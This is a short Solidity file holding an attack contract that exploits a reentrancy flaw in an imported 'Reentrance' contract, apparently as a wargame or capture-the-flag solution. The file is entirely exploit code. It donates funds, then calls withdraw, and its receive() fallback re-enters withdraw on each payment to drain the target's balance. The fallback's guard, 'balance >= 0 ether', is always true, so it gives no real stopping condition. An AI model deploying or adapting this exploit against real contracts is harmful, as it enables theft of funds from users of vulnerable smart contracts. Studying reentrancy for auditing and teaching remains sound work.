// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        Reentrance reentranceContract = Reentrance(contractAddress);
        reentranceContract.donate{value: address(this).balance}(address(this));
        reentranceContract.withdraw();
    }

    receive() external payable {
        if (contractAddress.balance >= 0 ether) {
            Reentrance reentranceContract = Reentrance(contractAddress);
            reentranceContract.withdraw();
        }
    }
}
